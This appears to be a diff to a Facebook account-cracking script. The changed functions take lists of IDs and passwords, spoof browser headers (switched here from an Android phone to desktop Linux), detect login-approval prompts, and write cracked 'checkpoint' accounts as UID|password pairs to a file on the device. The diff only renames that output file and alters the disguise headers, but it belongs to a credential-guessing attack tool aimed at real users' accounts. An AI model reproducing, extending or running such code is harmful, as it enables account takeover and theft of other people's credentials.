@@ -808,16 +808,16 @@ def bd1(ids,passlist):
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
     'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"vivo Y83"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"8.1.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
     'viewport-width': '980',
 }
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
@@ -876,8 +876,8 @@ def newidx(ids,names,passlist):
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
-				#print(f'\r\r\033[1;33m [SATAN-CP] '+uid+' | '+pas+'\033[1;97m')
-				open('/sdcard/SATAN-CP.txt','a').write(uid+'|'+pas+'\n')
+				#print(f'\r\r\033[1;33m [SHVNI-CP] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/SHVNI-CP.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
 			else:
